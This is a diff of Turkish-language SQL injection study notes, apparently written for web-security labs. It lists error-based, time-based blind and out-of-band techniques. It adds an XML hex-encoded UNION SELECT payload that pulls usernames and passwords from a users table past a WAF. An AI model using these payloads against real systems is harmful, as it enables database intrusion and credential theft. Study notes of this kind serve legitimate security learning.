@@ -158,7 +158,9 @@ Hedef: tablo adını bilmiyorsun, sütun adlarını bilmiyorsun → hepsini adı
 13. Visible error-based SQLi: `CAST((SELECT password FROM users LIMIT 1) AS int)` → hata mesajında veri sızıyor, brute force gereksiz
 14. Blind SQLi time delays: `pg_sleep(10)` → response süresinden sinyal (PostgreSQL)
 15. Blind SQLi time delays + info retrieval: `%3B` stacked query + `CASE WHEN ... THEN pg_sleep(5)` ile karakter karakter
-16. Out-of-band (teori): XXE + EXTRACTVALUE ile DNS exfiltration — Burp Pro gerekli
+16. Out-of-band interaction (teori): XXE + EXTRACTVALUE ile DNS lookup tetikleme — Burp Pro gerekli
+17. Out-of-band data exfiltration (teori): şifreyi subdomain olarak DNS'e ekleme — Burp Pro gerekli
+18. Filter bypass via XML encoding: WAF keyword engelliyor → `&#xHH;` ile XML hex encode → WAF bypass
 
 ## Blind SQLi — 5 Teknik
 
@@ -249,6 +251,11 @@ Sunucu cevap veremiyorsa (async, hata yok, zaman farkı yok) → DNS ile dışar
 
 -- Keyword (UNION, SELECT) engellendiğinde → case bypass
 ' uNiOn SeLeCt ...
+
+-- WAF varken → XML hex encoding (&#xHH; formatı)
+-- XML endpoint'lerde (stock check vb.) keyword'leri encode et
+<storeId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; &#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x7c;&#x7c;&#x27;&#x7e;&#x27;&#x7c;&#x7c;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64; &#x46;&#x52;&#x4f;&#x4d; &#x75;&#x73;&#x65;&#x72;&#x73;&#x2d;&#x2d;</storeId>
+-- WAF "UNION SELECT" görmez ama DB decode edip çalıştırır
 
 -- Diğer yöntemler: double writing (UNUNIONION), URL encoding (%55NION)
 ```
